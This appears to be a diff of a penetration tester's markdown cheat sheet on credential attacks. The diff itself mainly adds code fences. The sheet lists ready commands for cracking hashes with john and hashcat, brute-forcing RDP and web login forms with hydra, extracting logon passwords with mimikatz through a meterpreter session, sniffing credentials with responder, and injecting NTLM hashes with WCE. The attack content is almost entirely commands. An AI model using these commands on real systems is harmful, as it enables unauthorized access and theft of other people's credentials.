@@ -2,9 +2,24 @@
 
 
 ### Cracking
+
+
+```
 john -w=/usr/share/wordlists/rockyou.txt --format=<format> <hashes>
 
+```
+
+
+
+
+```
 hashcat -m 5600 -a 1 <hashes>  -r /usr/share/hashcat/rules/combinator.rule
+
+```
+
+
+
+```
 
 hydra -L <username list> -P <password list> -M <target list> <protocol>
 hydra -l <username> -p <password> <target> <protocol>
@@ -12,13 +27,18 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt -M 3389.txt rdp
 
 hydra -l administrator -p admin -M /root/Desktop/target.txt http-form-post "/teamquest/cgi-bin/login:username=^USER^&pass=^PASS^:S=302 Found" -s 2780
 hydra -l administrator -p admin 10.0.0.10 http-form-post "/teamquest/cgi-bin/login:username=^USER^&pass=^PASS^:S=302 Found" -s 2780
-------------------------------------------------------------------------------------------------------
+```
+
+
 
 ### Dump Hashes
 
 fgdump, pwdump6, pwdump7, smbexec, wce
 
-mimikatz
+**mimikatz
+**
+
+```
 meterpreter > upload /usr/share/mimikatz/Win32/mimikatz.exe .
 meterpreter > upload /usr/share/mimikatz/Win32/mimikatz.sys .
 meterpreter > upload /usr/share/mimikatz/Win32/sekurlsa.dll .
@@ -26,15 +46,25 @@ meterpreter > shell
 mimikatz.exe
 priviledge::debug
 sekurlsa::logonpasswords
-------------------------------------------------------------------------------------------------------
+```
+
+
 
 ### Sniffing
 
+
+
+```
 responder -i <IP> -wrf
-------------------------------------------------------------------------------------------------------
+
+```
+
 
 ### Windows Credential Editor (WCE)
 
+
+
+```
 How do I change my current NTLM credentials?
 wce.exe -s <username>:<domain>:<lmhash>:<nthash>
 
@@ -46,3 +76,6 @@ wce.exe -g <cleartext password>
 
 How can I write hashes obtained by WCE to a file?
 wce.exe -o hashes.txt
+```
+
+
